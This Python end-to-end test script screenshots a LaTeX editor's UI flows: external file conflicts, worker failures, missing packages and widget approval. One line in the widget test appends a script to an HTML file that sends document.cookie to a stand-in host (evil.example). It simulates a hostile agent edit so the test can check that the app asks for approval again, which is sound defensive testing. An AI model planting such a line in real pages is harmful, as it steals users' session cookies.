    kinds = sorted({e["kind"] for e in only(between(m_first, m_same), "compile.precheck")})
    check("external-tool" in kinds, "first run findings: %s" % kinds)
    check(shown[0]["count"] == len(only(between(m_first, m_same), "compile.precheck")), "auto count %s" % shown[0])
    check(not only(between(m_same, m_quiet), "precheck.panel-shown"), "the same set popped again")
    dis = only(between(m_same), "precheck.panel-dismissed")
    check(dis and dis[0]["dontShowAgain"] is True, "dismissed: %s" % dis)
    check([e["on"] for e in only(between(m_same), "precheck.popup-setting")] == [False], "popup setting")
    check(len(dis) == 2 and dis[1]["dontShowAgain"] is False, "Escape close: %s" % dis)
    later = only(between(m_quiet), "compile.precheck")
    check(any(e["kind"] == "shell-escape" for e in later), "the changed set lacks minted: %s" % later)
    check(shown[1]["count"] == len(later), "request count %s vs %d" % (shown[1], len(later)))
    print("stills: warnings panel popped once (%d findings: %s), stayed off for a changed set, opened on request (%d)"
          % (shown[0]["count"], ",".join(kinds), shown[1]["count"]))


def state9():
    """External changes to open files. A clean buffer takes the disk content
    quietly, whether the file was rewritten in place or replaced by a rename
    (atomic save), and whether it is the active tab or a background one. A
    buffer with unsaved edits raises the conflict dialog instead, and writes to
    it (autosave here) are held until the user chooses; keeping the edits lets
    the next save replace the disk version."""
    ext = FIX + "/ext"
    os.makedirs(ext, exist_ok=True)
    with open(ext + "/main.tex", "w") as f:
        f.write("\\documentclass{article}\n\\begin{document}\n\\input{ch}\nmain body\n\\end{document}\n")
    with open(ext + "/ch.tex", "w") as f:
        f.write("chapter body\n")

    def replace_over(path, content):
        """Write a sibling temp file, rename it over `path`."""
        t = path + ".tmp~"
        with open(t, "w") as f:
            f.write(content)
        os.replace(t, path)

    def tree_click(y):
        """Click a file row in the tree (rows sort by name: ch.tex, main.tex)."""
        click_at(70, y)
        time.sleep(2)

    start_app(ext)
    wait_window(300)
    window_size(1600, 900)
    open_project()
    m_active = now_ms()
    replace_over(ext + "/main.tex", "\\documentclass{article}\n\\begin{document}\n\\input{ch}\n"
                 "main body, replaced by rename\n\\end{document}\n")
    wait_event("file.reload", m_active, 20)
    m_open = now_ms()
    tree_click(104)
    wait_event("file.open", m_open, 20)
    tree_click(130)
    m_bg = now_ms()
    replace_over(ext + "/ch.tex", "chapter body, replaced by rename\n")
    wait_event("file.reload", m_bg, 20)
    click_editor()
    m_dirty = now_ms()
    # Type, then change the file before autosave (1.2 s) can write the edit.
    xdo(DISP, "type", "--delay", "20", "zz")
    with open(ext + "/main.tex", "w") as f:
        f.write("\\documentclass{article}\n\\begin{document}\n\\input{ch}\nmain body, edited outside\n\\end{document}\n")
    wait_event("file.external-conflict", m_dirty, 20)
    wait_event("file.save-failed", m_dirty, 20)
    # Ctrl+S while the write is held is refused too, and says so.
    m_manual = now_ms()
    key("ctrl+s")
    wait_event("file.save-failed", m_manual, 10)
    if not any(e.get("action") == "file.save-failed" and e.get("trigger") == "manual"
               for e in acts(since_events(m_manual))):
        die("Ctrl+S during a held conflict failed silently")
    time.sleep(1)
    shot("09-conflict")
    if "edited outside" not in open(ext + "/main.tex").read():
        die("a held write reached disk during the conflict")
    m_keep = now_ms()
    key("Escape")
    wait_event("file.keep-mine", m_keep, 10)
    wait_event("file.save", m_keep, 20)
    time.sleep(1)
    shot("09-kept")
    stop_app()

    evs = APPLOG.events()

    def find(name, a, b=None):
        return [e for e in evs if isinstance(e.get("event"), dict) and e["event"].get("action") == name
                and e["at"] > a and (b is None or e["at"] <= b)]

    def names(es):
        return [e["event"]["path"].rsplit("/", 1)[-1] for e in es]

    def check(cond, msg):
        if not cond:
            die("external change check failed: " + msg)

    r1 = find("file.reload", m_active, m_bg)
    check("main.tex" in names(r1) and all(e["actor"] == "system" for e in r1), "active rename-over: %s" % r1)
    check("ch.tex" in names(find("file.reload", m_bg, m_dirty)), "background rename-over")
    check(not find("file.external-conflict", m_active, m_dirty), "a clean buffer raised a conflict")
    check(names(find("file.external-conflict", m_dirty, m_keep)) == ["main.tex"],
          "conflict: %s" % find("file.external-conflict", m_dirty, m_keep))
    held = [e for e in find("file.save-failed", m_dirty, m_keep) if e["event"].get("trigger") == "auto"]
    check(held and "changed on disk" in held[0]["event"]["error"], "autosave not held: %s" % held)
    check(not find("file.reload", m_dirty, m_keep), "unsaved edits were reloaded over")
    check(names(find("file.keep-mine", m_keep)) == ["main.tex"], "keep-mine")
    check([e for e in find("file.save", m_keep) if e["event"]["path"].endswith("/main.tex")], "no save after keeping edits")
    text = open(ext + "/main.tex").read()
    check("zz" in text and "edited outside" not in text, "disk after keep: %r" % text)
    print("stills: external changes ok: rename-over reloads (active + background), conflict held %d autosave(s), "
          "keep-mine saved" % len(held))


def state12():
    """Worker failure: with the pdf.js worker URL broken at the vite layer,
    opening a compiled project emits preview.load-failed once and the
    preview renders its error branch instead of hanging. Opt-in
    (STILLS_STATES=12): the break flag stays out of every other state."""
    breakfile = os.environ.get("STILLS_BREAK_PDF_WORKER") or os.path.join(OUT, ".break-worker")
    log("pre-warming engine cache via driver")
    if not run_driver("driver-warm12.jsonl", 150, FIX + "/simple"):
        die("warm driver failed")
    with open(breakfile, "w") as f:
        f.write("pdf.worker\n")
    try:
        mstate = now_ms()
        start_app(FIX + "/simple")
        wait_window(300)
        open_project()
        click_editor()
        key("ctrl+r")
        wait_event("compile.finish", mstate, 300)
        # The worker's error listener fires once per launch, so the wait
        # starts at launch: a preview open before the recompile counts.
        wait_event("preview.load-failed", mstate, 60)
        time.sleep(2)
        shot("12-worker-failed")
        stop_app()
    finally:
        if os.path.isfile(breakfile):
            os.remove(breakfile)
    evs = acts(since_events(mstate))
    fails = [e for e in evs if e.get("action") == "preview.load-failed"]
    if not fails or "pdf worker failed to load" not in str(fails[0].get("error", "")):
        die("no worker load failure on the bus: %s" % fails)
    check_log("log.open compile.finish preview.load-failed")
    print("stills: worker failure rendered the preview error branch (%s)" % fails[0].get("error"))


# ---- run --------------------------------------------------------------------


def state10():
    """A package the project lacks is an error that names it. A copy of the
    playground without maleficium-interactive.sty fails on Ctrl+R with the
    file named and the hint to add it to the project folder; the pre-compile
    check warns about it too. Once the file is in the project folder (an
    ordinary project file, as a template-made project has it) the next
    compile succeeds. The app writes nothing into the project."""
    proj = FIX + "/interactive"
    shutil.copytree(ROOT + "/e2e/fixtures/playground", proj)
    sty = proj + "/maleficium-interactive.sty"
    if os.path.exists(sty):
        os.remove(sty)
    shipped = ROOT + "/src-tauri/interactive/maleficium-interactive.sty"
    start_app(proj)
    wait_window(300)
    window_size(1600, 900)
    open_project()
    click_editor()
    # The first compile fails on the missing package (and caches the bundle
    # index); the second then warns before compiling.
    m_miss = now_ms()
    key("ctrl+r")
    wait_event("compile.missing", m_miss, 300)
    wait_event("compile.finish", m_miss, 300)
    shot("10-interactive-compile-error")
    click_editor()
    m_warn = now_ms()
    key("ctrl+r")
    wait_event("compile.precheck", m_warn, 120)
    wait_event("compile.finish", m_warn, 300)
    if os.path.exists(sty):
        die("the compile wrote the package into the project")
    shot("10-interactive-missing")
    shutil.copy(shipped, sty)
    time.sleep(2)
    click_editor()
    m_ok = now_ms()
    key("ctrl+r")
    wait_event("compile.finish", m_ok, 300)
    time.sleep(1)
    stop_app()

    evs = APPLOG.events()
    miss = [e["event"] for e in evs if isinstance(e.get("event"), dict) and e["event"].get("action") == "compile.missing" and e["at"] > m_miss]
    if not miss or miss[0].get("file") != "maleficium-interactive.sty" or miss[0].get("reason") != "not-in-bundle":
        die("the missing package was not named: %s" % miss[:1])
    msgs = [e.get("message", "") for e in evs if e.get("at", 0) > m_miss and "maleficium-interactive.sty is not in the TeX bundle" in e.get("message", "")]
    if not any("add it to your project folder" in m for m in msgs):
        die("no event carried the add-it-to-your-project-folder hint: %s" % msgs[:2])
    fin = [e["event"] for e in evs if isinstance(e.get("event"), dict) and e["event"].get("action") == "compile.finish" and e["at"] > m_ok]
    if not fin or fin[0].get("ok") is not True:
        die("the compile with the package in the project failed: %s" % fin[:1])
    print("stills: a missing package is named with the project-folder hint; with the file in the project it compiles")


def widget_events(since):
    return [e["event"] for e in APPLOG.events()
            if isinstance(e.get("event"), dict) and e["at"] > since
            and e["event"].get("action") in ("widget.approved", "widget.revoked", "widgets.auto-approve")]


def store_value(field):
    """A field of the project's approval store, read from the contained app data."""
    base = os.path.join(FAKEHOME, ".local", "share", IDENT, "maleficium-widgets", "approvals")
    for d in os.listdir(base):
        with open(os.path.join(base, d, "store.json")) as f:
            return json.load(f)[field]
    die("no approval store under " + base)


def open_widgets(still=None):
    """View > Widgets through the command palette, matched by its menu path."""
    key("ctrl+shift+p")
    time.sleep(2)
    click_at(800, 91)
    time.sleep(1)
    xdo(DISP, "type", "--delay", "40", "view widgets")
    time.sleep(2)
    if still:
        shot(still)
    xdo(DISP, "key", "Return")
    time.sleep(3)


def top_band(name):
    """Mean luminance of a still's top band (toolbar and tabs, never under a
    dialog's paper): a modal's backdrop dims it."""
    from PIL import Image, ImageStat
    im = Image.open(os.path.join(OUT, name + ".png")).convert("L")
    return ImageStat.Stat(im.crop((0, 0, im.width, 80))).mean[0]


def expect_prompt(name, base, shown):
    """A still with the approval prompt up is dimmed by its backdrop; one
    without matches the undimmed baseline."""
    v = top_band(name)
    log("%s: top band %.1f (baseline %.1f)" % (name, v, base))
    if shown and not v < base * 0.8:
        die("%s: no approval prompt in front of the window (top band %.1f, baseline %.1f)" % (name, v, base))
    if not shown and not v > base * 0.9:
        die("%s: something modal is still up (top band %.1f, baseline %.1f)" % (name, v, base))


def compile_asking(since, cause, digest=None):
    """Ctrl+R; returns the widget.approval-required the compile put on the bus."""
    click_editor()
    key("ctrl+r")
    wait_event("compile.finish", since, 300)
    e = APPLOG.wait("widget.approval-required", since, 30,
                    lambda ev: ev.get("path") == "widgets/demo")
    if not e:
        die("the compile put no widget.approval-required for widgets/demo on the bus")
    ev = e["event"]
    if ev.get("cause") != cause or (digest and ev.get("digest") != digest):
        die("approval-required: want cause %s digest %s, got %s" % (cause, digest, ev))
    time.sleep(3)
    return ev


def state11():
    """An html widget the user never approved: the first compile raises the
    Approve | Skip prompt; Skip dismisses it and a recompile of the same
    version asks nothing. Then View > Widgets walks pending -> approved ->
    changed (an edit on disk, with the diff shown); the next compile asks
    about the edited version and Approve in the prompt approves it; the
    panel revokes it and turns the project's auto-approval on and off. The
    prompt's presence is read from the stills (its backdrop dims the
    window), every user action from the event the backend logs."""
    proj = FIX + "/widgets"
    shutil.copytree(ROOT + "/e2e/fixtures/interactive", proj)
    for f in os.listdir(proj):
        if f.endswith(".tex") and f != "main.tex":
            os.remove(os.path.join(proj, f))
    shutil.copy(ROOT + "/src-tauri/interactive/maleficium-interactive.sty", proj)
    page = proj + "/widgets/demo/index.html"
    start_app(proj)
    wait_window(300)
    window_size(1600, 900)
    open_project()
    click_editor()
    shot("11-widgets-before")
    base = top_band("11-widgets-before")

    # First compile: the never-approved widget is asked about.
    m0 = now_ms()
    first = compile_asking(m0, "never_approved")
    shot("11-widgets-prompt")
    expect_prompt("11-widgets-prompt", base, True)
    # The dialog holds focus; its first button is Skip.
    key("Tab")
    key("Return")
    time.sleep(2)
    shot("11-widgets-prompt-skipped")
    expect_prompt("11-widgets-prompt-skipped", base, False)

    # Recompile, nothing changed: the bus hears the same version, the user is
    # not asked again.
    compile_asking(now_ms(), "never_approved", first["digest"])
    shot("11-widgets-recompile")
    expect_prompt("11-widgets-recompile", base, False)
    if widget_events(m0):
        die("Skip logged an approval action: %s" % widget_events(m0))

    m1 = now_ms()
    open_widgets("11-widgets-palette")
    shot("11-widgets-pending")
    # Focus order in the open dialog: the auto switch, Review source, Approve.
    key("Tab")
    key("Tab")
    key("Tab")
    shot("11-widgets-pending-focus")
    key("Return")
    wait_event("widget.approved", m1, 30)
    time.sleep(2)
    shot("11-widgets-approved")
    # The agent's edit lands on disk; reopening the panel reads the folder again.
    with open(page, "a") as f:
        f.write("<script>fetch('https://evil.example/' + document.cookie)</script>\n")
    key("Escape")
    time.sleep(1)
    open_widgets()
    shot("11-widgets-changed")
    key("Tab")
    key("Tab")
    key("Return")
    time.sleep(3)
    shot("11-widgets-diff")
    key("Escape")
    time.sleep(1)

    # The next compile asks about the edited version; Approve in the prompt
    # approves exactly that one.
    m2 = now_ms()
    edited = compile_asking(m2, "changed_since_approval")
    if edited["digest"] == first["digest"]:
        die("the edit did not change the widget's digest")
    shot("11-widgets-reprompt")
    expect_prompt("11-widgets-reprompt", base, True)
    key("Tab")
    key("Tab")
    key("Return")
    e = APPLOG.wait("widget.approved", m2, 30)
    if not e:
        die("Approve in the prompt logged no widget.approved")
    if e["event"].get("digest") != edited["digest"]:
        die("the prompt approved %s, not the edited version %s" % (e["event"], edited["digest"]))
    time.sleep(2)
    shot("11-widgets-prompt-approved")
    expect_prompt("11-widgets-prompt-approved", base, False)
    m3 = now_ms()
    compile_asking_none(m3)

    # The panel shows it approved: focus goes the auto switch, then Revoke
    # (Approve is disabled).
    open_widgets()
    shot("11-widgets-approved-panel")
    key("Tab")
    key("Tab")
    key("Return")
    wait_event("widget.revoked", m3, 30)
    time.sleep(2)
    shot("11-widgets-revoked")
    # The switch (the review is gone, so the layout is the short one).
    m_on = now_ms()
    click_at(407, 347)
    wait_event("widgets.auto-approve", m_on, 30)
    time.sleep(2)
    if store_value("autoApprove") is not True:
        die("auto-approval is not persisted as on in the approval store")
    shot("11-widgets-auto-on")
    m_off = now_ms()
    click_at(407, 347)
    wait_event("widgets.auto-approve", m_off, 30)
    time.sleep(2)
    if store_value("autoApprove") is not False:
        die("auto-approval is not persisted as off in the approval store")
    stop_app()
    acts_seen = [(e["action"], e.get("on")) for e in widget_events(m0)]
    want = [("widget.approved", None), ("widget.approved", None), ("widget.revoked", None),
            ("widgets.auto-approve", True), ("widgets.auto-approve", False)]
    if acts_seen != want:
        die("widget events: %s" % acts_seen)
    widget = store_value("widgets")["widgets/demo"]
    if widget["revoked"] is not True:
        die("the revoke is not in the approval store")
    print("stills: approval prompt raised by the first compile, skipped, not raised again for the same version, "
          "raised again after an edit and approved from the prompt; widgets panel walked pending, approved, "
          "changed (diff shown), revoked; auto-approval on and off persisted; events %s" % acts_seen)


def compile_asking_none(since):
    """Ctrl+R on an approved widget: the compile asks nothing."""
    click_editor()
    key("ctrl+r")
    wait_event("compile.finish", since, 300)
    time.sleep(2)
    if APPLOG.find("widget.approval-required", since):
        die("a compile asked about an approved widget")
    shot("11-widgets-approved-recompile")


def main():
    global FIX, BIN_DIR
    atexit.register(cleanup)
    for sig in (signal.SIGINT, signal.SIGTERM):
        signal.signal(sig, lambda *_: sys.exit(1))
    log("contained home " + FAKEHOME)
    take_lock("/tmp/maleficium-stills-display-%s.lock" % DISP.lstrip(":"), "display " + DISP)
    take_lock(FAKEHOME + "/.stills-lock", "home " + FAKEHOME)
    for tool in ("Xvfb", "xdotool", "import", "curl"):
        if not shutil.which(tool):
            die("missing tool: " + tool)
    if subprocess.run(["xdotool", "search", "--onlyvisible", "--name", ".*"], capture_output=True).returncode != 0:
        log("starting Xvfb on " + DISP)
        procs.start(["Xvfb", DISP, "-screen", "0", "1600x900x24"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)

    # Scratch fixtures (never the repo originals): simple compiles clean, bad
    # fails fast with `\badcommand` on l.3.
    FIX = tempfile.mkdtemp(prefix="maleficium-stills-fix-", dir="/tmp")
    shutil.copytree(ROOT + "/e2e/fixtures/simple", FIX + "/simple")
    os.makedirs(FIX + "/bad")
    with open(FIX + "/bad/bad.tex", "w") as f:
        f.write("\\documentclass{article}\n\\begin{document}\n\\badcommand\n\\end{document}\n")
    reclaim()
    sweep_stale()

    # Build once, serve once: every state launches the same binary against the
    # same vite. Tauri bakes its config into the binary, so devUrl stays fixed
    # per port (an unchanged TAURI_CONFIG makes the build a no-op) and the
    # preset goes through STILLS_PRESET_FILE instead, which vite turns into a
    # `/?project=` redirect (vite.config.ts). Plain `cargo build` is the same
    # dev build `tauri dev` runs (no custom-protocol) and builds maleficium-mcp
    # too (State 2's driver runs it).
    open(PRESET, "w").close()
    # The worker-break flag for state 12: the path rides to vite, which 404s
    # the pdf.js worker only while the file exists. Absent everywhere else.
    os.environ.setdefault("STILLS_BREAK_PDF_WORKER", os.path.join(OUT, ".break-worker"))
    target = os.environ.get("CARGO_TARGET_DIR") or os.path.join(ROOT, "src-tauri", "target")
    BIN_DIR = os.path.join(target, "debug")
    # Exported: State 2's driver builds maleficium-mcp under the same config,
    # so its build is a no-op instead of a recompile.
    os.environ["TAURI_CONFIG"] = json.dumps({"build": {"devUrl": "http://localhost:%d/" % PORT}}, separators=(",", ":"))
    harness.build_app(OUT, ROOT, target, PORT, log)
    harness.start_vite(procs, OUT, ROOT, PRESET, PORT,
                       os.environ.get("VITE_CACHE_DIR", os.path.join(ROOT, "node_modules", ".vite")), log)
    log("vite serving on :%d" % PORT)

    for n in range(1, 13):
        if want(n):
            globals()["state%d" % n]()
    log("stills in %s:" % OUT)
    for f in sorted(os.listdir(OUT)):
        if f.endswith(".png"):
            print(os.path.join(OUT, f))


if __name__ == "__main__":
    main()
